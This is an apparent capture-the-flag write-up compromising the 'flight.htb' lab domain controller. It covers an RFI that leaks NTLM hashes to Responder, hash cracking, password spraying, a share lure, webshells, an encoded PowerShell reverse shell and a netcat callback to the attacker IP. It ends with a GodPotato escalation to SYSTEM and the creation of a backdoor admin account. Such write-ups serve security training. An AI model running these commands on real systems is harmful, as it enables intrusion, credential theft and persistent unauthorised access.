ME: 10.10.15.8
TARGET: 10.129.228.120

# NMAP

```
┌──(xmen㉿kali)-[~]
└─$ sudo nmap -sC -sV -p- -Pn --max-retries=1 10.129.228.120
[sudo] password for xmen: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-04 18:03 -0400
Nmap scan report for 10.129.228.120
Host is up (0.026s latency).
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: g0 Aviation
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-05 05:05:27Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-08-05T05:06:16
|_  start_date: N/A
|_clock-skew: 6h59m53s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 228.30 seconds
```

# SMB

Tried to null bind but it did not work

# HTTP - port 80

 Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1

g0 Aviation website, just a template with no real navigation. Did not find a simple /admin path so started by running dirb against it to see if I could find any directories of note:

```
└─$ dirb http://10.129.228.120 /usr/share/wordlists/dirb/big.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Aug  4 18:14:57 2026
URL_BASE: http://10.129.228.120/
WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt

-----------------

GENERATED WORDS: 20458                                                         

---- Scanning URL: http://10.129.228.120/ ----
==> DIRECTORY: http://10.129.228.120/Images/                                                          + http://10.129.228.120/aux (CODE:403|SIZE:303)
+ http://10.129.228.120/cgi-bin/ (CODE:403|SIZE:303)
+ http://10.129.228.120/com1 (CODE:403|SIZE:303)    
+ http://10.129.228.120/com2 (CODE:403|SIZE:303)    
+ http://10.129.228.120/com3 (CODE:403|SIZE:303)    
+ http://10.129.228.120/com4 (CODE:403|SIZE:303)    
+ http://10.129.228.120/con (CODE:403|SIZE:303)
==> DIRECTORY: http://10.129.228.120/css/      
+ http://10.129.228.120/examples (CODE:503|SIZE:403)
==> DIRECTORY: http://10.129.228.120/images/   
==> DIRECTORY: http://10.129.228.120/js/       
+ http://10.129.228.120/licenses (CODE:403|SIZE:422)
+ http://10.129.228.120/lpt1 (CODE:403|SIZE:303)    
+ http://10.129.228.120/lpt2 (CODE:403|SIZE:303)    
+ http://10.129.228.120/nul (CODE:403|SIZE:303)
+ http://10.129.228.120/phpmyadmin (CODE:403|SIZE:422)
+ http://10.129.228.120/prn (CODE:403|SIZE:303)
+ http://10.129.228.120/server-info (CODE:403|SIZE:422)
+ http://10.129.228.120/server-status (CODE:403|SIZE:422)
+ http://10.129.228.120/webalizer (CODE:403|SIZE:422) 
                                               
---- Entering directory: http://10.129.228.120/Images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.129.228.120/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.129.228.120/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://10.129.228.120/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                
-----------------
END_TIME: Tue Aug  4 18:24:31 2026
DOWNLOADED: 20458 - FOUND: 17
```

This also does not really find anything too usable. I can see that phpmyadmin is probably installed but I cannot access it directly. Seeing how there wasn't really much to do here, I tried to do a subdomain enumeration against flight.htb to see if any other VHosts will pop up. Used [[exploit-notes/web/api/index|subdomain_enumeration]] via ffuf to do this:

```
└─$ ffuf -u http://flight.htb -c  -w /usr/share/wordlists/amass/subdomains-top1mil-110000.txt -H "Host: FUZZ.flight.htb" -mc 200 -fs 7069

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://flight.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/amass/subdomains-top1mil-110000.txt
 :: Header           : Host: FUZZ.flight.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
 :: Filter           : Response size: 7069
________________________________________________

school                  [Status: 200, Size: 3996, Words: 1045, Lines: 91, Duration: 60ms]
:: Progress: [114606/114606] :: Job [1/1] :: 314 req/sec :: Duration: [0:03:23] :: Errors: 0 ::
```

This led me to school.flight.htb which I added to my /etc/hosts and navigated to.

## school.flight.htb

Here I found that the main page is an index.php that seems to take in a file.html and render it. This led me to thinking about a local file inclusion perhaps or even a remote file inclusion. I tested by trying to read /etc/passwd using many up directory separators (..) in the path but I got a "suspicious activity" banner. this tells me it is likely a vector here and guarded against in some ways.

For RFI, I tested that I was able to make it connect to my python simple server over http by doing:

```
http://school.flight.htb/index.php?view=http://10.10.15.8/about.php
```

So I tried to serve up a reverse shell by hosting the webshell PHP myself. While this did get the php for the webshell it did not work as it rendered out the code as text on the page instead of executing the PHP.

Since this is a windows machine and so far I have not had any creds and been unable to null bind, I started to think about whether I could get the NTLM hash for this web server service by making it do RFI from my machine while I am running responder. I thought something similar to [[places-to-steal-ntlm-creds#WebDAV auth coercion / credential validation via `davclnt.dll,DavSetCookie`]] may work here

So I spun up responder on the tun0 interface and it also runs an http server. Then I reloaded the RFI for my "about.php" webshell from earlier

```
┌──(xmen㉿kali)-[~/flight]
└─$ sudo responder -I tun0
```

Then by running this request in browser as such:

```
http://school.flight.htb/index.php?view=//10.10.15.8/about.php
```

I got the server to connect to responder's SMB server and give an NTLMv2 challenge to responder:

```

[+] Listening for events...                                                                                                                                                                                                                 

[SMB] NTLMv2-SSP Client   : 10.129.228.120
[SMB] NTLMv2-SSP Username : flight\svc_apache
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:67a36863908a2109:5D287ADBC2F96DB6DEB6A740C537FF05:01010000000000008060C7DE4324DD014BF24E35C5C20120000000000200080037004A005500530001001E00570049004E002D00580056005A005700360039004B00470058005000360004003400570049004E002D00580056005A005700360039004B0047005800500036002E0037004A00550053002E004C004F00430041004C000300140037004A00550053002E004C004F00430041004C000500140037004A00550053002E004C004F00430041004C00070008008060C7DE4324DD01060004000200000008003000300000000000000000000000003000007BDF5C7DC508DDEED5FCE9AF44B0996A191A6668933FC428BC11D10BB6D0E19F0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310035002E0038000000000000000000
```

Now I continued by cracking this in john:

```
└─$ john svc_apache_hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
S@Ss!K@*t13      (svc_apache)     
1g 0:00:00:09 DONE (2026-08-04 19:08) 0.1069g/s 1140Kp/s 1140Kc/s 1140KC/s S@anmeet2k2..S@29$JL
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

This gave me credentials for the svc_apache user account.
# SVC_APACHE

First I started by enumerating SMB and trying to bind to ldap once again as this user:

## SMB

```
┌──(xmen㉿kali)-[~/flight]
└─$ smbclient -L \\\\10.129.228.120 -U "svc_apache"
Password for [WORKGROUP\svc_apache]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shared          Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
        Web             Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.228.120 failed (Error NT_STATUS
```

This gave me a list of shares and the Shared, Users and Web shares were most interesting.

### Users share

This was the C:\Users folder as an SMB share. I could access svc_apache and see the C.Bum user as also having a folder alongside Administrator and other folders.

### Shared share

Empty

### Web share

Has the static files for the flight.htb site and a different folder to serve up the PHP for the school.flight.htb site. This interestingly had an lfi.html file:

```
──(xmen㉿kali)-[~/flight]
└─$ cat lfi.html                           
<h1>LFI Prevented! Incident has been reported.</h1>
<script>document.write("<html><head><title>Error!</title></head><body><h1>Suspicious Activity Blocked!</body><html>")</script>     
```

This seems to be what causes the guard against LFI using .. in path.
## LDAP

```
┌──(xmen㉿kali)-[~/flight]
└─$ netexec ldap 10.129.228.120 -u 'svc_apache' -p 'S@Ss!K@*t13' --users       
LDAP        10.129.228.120  389    G0               [*] Windows 10 / Server 2019 Build 17763 (name:G0) (domain:flight.htb) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.228.120  389    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
LDAP        10.129.228.120  389    G0               [*] Enumerated 15 domain users: flight.htb
LDAP        10.129.228.120  389    G0               -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.129.228.120  389    G0               Administrator                 2022-09-22 16:17:02 0        Built-in account for administering the computer/domain      
LDAP        10.129.228.120  389    G0               Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.129.228.120  389    G0               krbtgt                        2022-09-22 15:48:01 0        Key Distribution Center Service Account                     
LDAP        10.129.228.120  389    G0               S.Moon                        2022-09-22 16:08:22 0        Junion Web Developer                                        
LDAP        10.129.228.120  389    G0               R.Cold                        2022-09-22 16:08:22 0        HR Assistant                                                
LDAP        10.129.228.120  389    G0               G.Lors                        2022-09-22 16:08:22 0        Sales manager                                               
LDAP        10.129.228.120  389    G0               L.Kein                        2022-09-22 16:08:22 0        Penetration tester                                          
LDAP        10.129.228.120  389    G0               M.Gold                        2022-09-22 16:08:22 0        Sysadmin                                                    
LDAP        10.129.228.120  389    G0               C.Bum                         2022-09-22 16:08:22 0        Senior Web Developer                                        
LDAP        10.129.228.120  389    G0               W.Walker                      2022-09-22 16:08:22 0        Payroll officer                                             
LDAP        10.129.228.120  389    G0               I.Francis                     2022-09-22 16:08:22 0        Nobody knows why he's here                                  
LDAP        10.129.228.120  389    G0               D.Truff                       2022-09-22 16:08:22 0        Project Manager                                             
LDAP        10.129.228.120  389    G0               V.Stevens                     2022-09-22 16:08:22 0        Secretary                                                   
LDAP        10.129.228.120  389    G0               svc_apache                    2022-09-22 16:08:23 0        Service Apache web                                          
LDAP        10.129.228.120  389    G0               O.Possum                      2022-09-22 16:08:23 0        Helpdesk          
```

This gave me a user list.

I also tried to then run impacket-GetUserSPNs to [[kerberoast]] and see if I can get more credentials from now having one user's password:

```
$ impacket-GetUserSPNs -request -dc-ip 10.129.228.120 flight.htb/svc_apache -outputfile hashes.kerberoast
```

Both this and netexec yielded nothing however

So now I finally ran bloodhound to see if anything comes from owning svc_apache as is.

# Bloodhound

Found no outbound control edges from here.

# Password spraying with svc_apache
At this point I dove back into the SMB to try some password spraying and found that I could get auth as S.Moon user with the same password:

```
┌──(xmen㉿kali)-[~/flight]
└─$ netexec smb 10.129.228.120 -u users -p 'S@Ss!K@*t13'             
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.120  445    G0               [-] flight.htb\Guest:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [-] flight.htb\krbtgt:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.129.228.120  445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 

```

From here I tried to use these creds:

```
S.Moon
S@Ss!K@*t13
```

# S.Moon

## SMB

```
└─$ netexec smb 10.129.228.120 -u 'S.Moon' -p 'S@Ss!K@*t13' --shares
SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.228.120  445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
SMB         10.129.228.120  445    G0               [*] Enumerated shares
SMB         10.129.228.120  445    G0               Share           Permissions     Remark
SMB         10.129.228.120  445    G0               -----           -----------     ------
SMB         10.129.228.120  445    G0               ADMIN$                          Remote Admin
SMB         10.129.228.120  445    G0               C$                              Default share
SMB         10.129.228.120  445    G0               IPC$            READ            Remote IPC
SMB         10.129.228.120  445    G0               NETLOGON        READ            Logon server share 
SMB         10.129.228.120  445    G0               Shared          READ,WRITE      
SMB         10.129.228.120  445    G0               SYSVOL          READ            Logon server share 
SMB         10.129.228.120  445    G0               Users           READ            
SMB         10.129.228.120  445    G0               Web             READ     
```

### Shared SMB share

This share is empty but user writeable by me as S.Moon

I started by dropping a .lnk lure here for responder to listen back for. By following instructions from [[places-to-steal-ntlm-creds#Writable SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)]] I generated and dropped a desktop.ini lure and got back this hash in responder:

```
c.bum::flight.htb:a7087257c2fdc9a0:7D6351CFB73B720051D8CE2C27A7B764:010100000000000080D941024B24DD01F0119D75BDFCA84D0000000002000800550044004500530001001E00570049004E002D005700540045005100440055004800350033003700370004003400570049004E002D00570054004500510044005500480035003300370037002E0055004400450053002E004C004F00430041004C000300140055004400450053002E004C004F00430041004C000500140055004400450053002E004C004F00430041004C000700080080D941024B24DD01060004000200000008003000300000000000000000000000003000007BDF5C7DC508DDEED5FCE9AF44B0996A191A6668933FC428BC11D10BB6D0E19F0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310035002E0038000000000000000000
```

Once again, using john to crack it:

```
┌──(xmen㉿kali)-[~/flight]
└─$ john cbum_hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
Tikkycoll_431012284 (c.bum)     
1g 0:00:00:09 DONE (2026-08-04 20:01) 0.1052g/s 1109Kp/s 1109Kc/s 1109KC/s Tilapia5%..Tikidog
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

This gives another set of creds:

```
c.bum
Tikkycoll_431012284
```

# C.Bum

## SMB

```
SMB         10.129.228.120  445    G0               Share           Permissions     Remark
SMB         10.129.228.120  445    G0               -----           -----------     ------
SMB         10.129.228.120  445    G0               ADMIN$                          Remote Admin
SMB         10.129.228.120  445    G0               C$                              Default share
SMB         10.129.228.120  445    G0               IPC$            READ            Remote IPC
SMB         10.129.228.120  445    G0               NETLOGON        READ            Logon server share 
SMB         10.129.228.120  445    G0               Shared          READ,WRITE      
SMB         10.129.228.120  445    G0               SYSVOL          READ            Logon server share 
SMB         10.129.228.120  445    G0               Users           READ            
SMB         10.129.228.120  445    G0               Web             READ,WRITE   
```

This allows for writes to the Web smb share which also means write to the websites so I can drop my original reverse shell here as well.

This gives our first shell as svc_apache

# Shell as SVC_APACHE

```
└─$ nc -lvnp 9001                                               
listening on [any] 9001 ...
connect to [10.10.15.8] from (UNKNOWN) [10.129.228.120] 52780
SOCKET: Shell has connected! PID: 2364
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\school.flight.htb>whoami
flight\svc_apache

C:\xampp\htdocs\school.flight.htb>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeCreateGlobalPrivilege       Create global objects          Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

From here, I used c.bum credentials to launch another reverse shell using [runasCs](https://github.com/antonioCoco/RunasCs) as described in [[switch-user-on-windows#RunasCS]]:

```
RunasCs.exe c.bum Tikkycoll_431012284 cmd -r 10.10.15.8:9003
```

This gave me a shell as C.Bum

# Shell as C.BUM

Found the user flag in their desktop

As this user is able to read and possibly write to C:\inetpub\development (instead of wwwroot) I thought about [[iis-internet-information-services#Writable webroot → ASPX command shell]] whereby I could write an ASPX shell and run that to get another rev shell as the iis service account (which usually may have SeImpersonate privileges). So I hosted the webshell and did an iwr to download it onto the development folder as seen in the notes.

From here I also ran netstat to see open ports and saw a lot of listening ports. Since I couldn't see the IIS website from outside as port 80 is only running the XAMPP stack, it must be available internally.

I decided to get going with chisel to start poking port forwards and seeing if I find the port for the website where I just dropped my webshell. For this I did as listed in [[/exploit-notes/windows/privilege-escalation/index#Open Ports]]


This shows a locally accessible website on port 8000 which was my first guess due to being a common higher port like 8080 instead of the usual port 80 for http. Here I was able to access the flight website as in the development folder for IIS. Then I accessed my shell.aspx

This allowed me to run whoami and get command execution as iis apppool\defaultapppool:

```
Program c:\windows\system32\cmd.exe

Arguments /c whoami

iis apppool\defaultapppool
```

From here I ran a reverse shell command to get a proper connect back on netcat:

```
Program C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

Arguments -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AOAAiACwAOQAwADAANgApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```

# Shell as IIS Apppool

Running whoami /priv shows a known good privilege escalation point in the form of SeImpersonate:

```
PS C:\windows\system32\inetsrv> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

So I was able to use GodPotato to get a shell back as NT Authority/System (after moving nc64.exe onto the box via the xampp SMB share):

```
GodPotato-NET4.exe -cmd "C:\xampp\htdocs\nc64.exe 10.10.15.8 9008 -e cmd.exe"
```

```
┌──(xmen㉿kali)-[~/flight]
└─$ nc -lvnp 9008
listening on [any] 9008 ...
connect to [10.10.15.8] from (UNKNOWN) [10.129.228.120] 61135
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs>whoami
whoami
nt authority\system

C:\xampp\htdocs>cd C:\Users\Administrator
cd C:\Users\Administrator

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>type root.txt
type root.txt
664aa34ad816ec7b520c668f3a9c3981
```

From here I was also able to use [[add-edit-delete-users-on-windows]] to add a new user pwned with remote management users group membership and admin group membership:

```
┌──(xmen㉿kali)-[~/flight]
└─$ evil-winrm -u 'pwned' -p 'P@ssw0rd!' -i 10.129.228.120
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\pwned\Documents> whoami
flight\pwned
*Evil-WinRM* PS C:\Users\pwned\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
*Evil-WinRM* PS C:\Users\pwned\Documents> 
```

==DONE==